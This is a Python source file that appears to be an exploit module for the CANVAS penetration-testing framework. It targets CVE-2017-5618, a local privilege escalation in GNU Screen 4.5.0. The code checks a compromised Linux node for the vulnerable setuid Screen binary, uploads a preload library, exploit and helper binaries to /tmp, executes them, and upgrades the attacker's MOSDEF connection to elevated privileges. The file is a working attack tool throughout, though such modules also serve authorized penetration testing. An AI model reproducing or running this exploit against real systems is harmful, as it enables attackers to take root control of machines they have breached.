#!/usr/bin/env python

import sys
import re
import logging

from exploitutils import *
from canvaserror import *

from ExploitTypes.linuxLocalExploit import LinuxLocalExploit

if '.' not in sys.path:
    sys.path.append('.')

NAME                           = 'GNU Screen v4.5.0 local privilege escalation'
DESCRIPTION                    = 'Elevate MOSDEF Node privileges'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'GNU'
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['CVE Name']      = 'CVE-2017-5618'
DOCUMENTATION['CVE Url']       = 'N/A'
DOCUMENTATION['References']    = 'https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html'

VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [ ["Linux",  "x32"], ["Linux",  "x64"] ]

DOCUMENTATION['Notes']         = """

Tested on:
Ubuntu 16.10 x64
Ubuntu 16.04 LTS x64
Ubuntu 14.10 LTS x64
Ubuntu 14.04 LTS x32

"""

class theexploit(LinuxLocalExploit):
    def __init__(self):
        LinuxLocalExploit.__init__(self)
        self.name               = NAME
        self.node               = None
        self.local_res          = os.path.join(os.path.dirname(__file__), 'Resources')
        self.local_helper       = self.local_helper_64
        self.local_exp          = os.path.join(self.local_res, 'x_64')
        self.remote_exp         = '/tmp/x'
        self.remote_helper      = '/tmp/h'
        self.remote_lib         = '/tmp/libup.so'

    def is_vulnerable(self):
        if self.node and self.node.shell:
            check_path = self.node.shell.runcommand("which screen")
            if not check_path:
                # Screen is missing
                logging.warning("GNU Screen is missing in target")
                return False
            path = ''.join(check_path.splitlines())
            command = path + " -v"
            #print "command %s" % command
            res = self.node.shell.runcommand(command)
            if res:
                # Checking Screen version
                pattern="(.*) version (\d*.\d*.\d*)"
                obj_re = re.search(pattern, res, flags=0)
                try:
                    version = obj_re.group(2)
                    if version == "4.05.00":
                        logging.info("GNU Screen %s is in target" % version)
                        # Checking setuid flag
                        if self.check_setuid(path):
                            return True
                        else:
                            logging.error("GNU Screen doesn't have setuid flag")
                    else:
                        logging.error("Found GNU Screen %s" % version)
                except:
                    raise
        return False

    def check_setuid(self,binary_path):
        return self.compromised(binary_path,3)

    def run(self):
        for node in self.argsDict['passednodes']:
            self.node = node
            self.setInfo("%s (in progress on node %s)" % (self.name, self.node))

            if self.node.shell is None:
                logging.critical("Node has no shell server available")
                logging.critical("Bailing")
                self.setInfo("%s Bailing (Node has no shell server available)" % (self.name))
                return 0

            if not self.is_linux_node():
                logging.error("Not a Linux Node ...")
                self.setInfo("%s Done (Failed - Not a Linux node)" % (self.name))
                return 0

            if not self.is_vulnerable():
                logging.error("Target not vulnerable")
                self.setInfo("%s Done (Target not vulnerable)" % (self.name))
                return 0
            else:
                logging.info("Target seems vulnerable!!!")

            if self.is_64bit_node():
                logging.warning("Targeting 64bit")
                self.local_lib    = os.path.join(self.local_res, 'libup.so')
            elif self.is_32bit_node():
                logging.warning("Targeting 32bit")
                self.local_exp    = os.path.join(self.local_res, 'x_32')
                self.local_helper = self.local_helper_32
                self.local_lib    = os.path.join(self.local_res, 'libup32.so')
            else:
                logging.error("Unsupported node type")
                continue

            logging.info("Uploading lib to preload")
            if self.nodeUpload(self.local_lib, self.remote_lib) == False:
                self.setInfo("%s Done (Failed to upload preload source)" % (self.name))
                continue

            self.add_file_for_cleanup(self.remote_lib)
            self.setProgress(20)

            logging.info("Uploading helper and exploit")
            if self.nodeUpload(self.local_exp, self.remote_exp) == False:
                self.setInfo("%s Done (Failed to upload exploit)" % (self.name))
                continue
            self.add_file_for_cleanup(self.remote_exp)
            self.setProgress(40)

            if self.nodeUpload(self.local_helper, self.remote_helper) == False:
                self.setInfo("%s Done (Failed to upload helper)" % (self.name))
                continue
            self.setProgress(60)
            self.add_file_for_cleanup(self.remote_helper)

            logging.info("Executing exploit")
            self.fork_and_exec(self.remote_exp, wait = 1)
            logging.info("Waiting...")
            self.setProgress(90)

            # wait 5 secs for the exploit to complete
            wait_secs = 5
            if self.compromised(self.remote_helper, wait_secs):
                logging.warning("Compromised!")
                logging.info("Upgrading MOSDEF connection loop")
                self.fork_and_exec(self.remote_helper, wait = 1)
                self.init_mosdef_upgrade()
                logging.info("Done")
                self.setInfo("%s Done (Success)" % (self.name))
            else:
                logging.error("Looks like we failed, try again!")
                self.setInfo("%s Done (Failed)" % (self.name))
                self.setProgress(-1)
                return 0


        return 1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
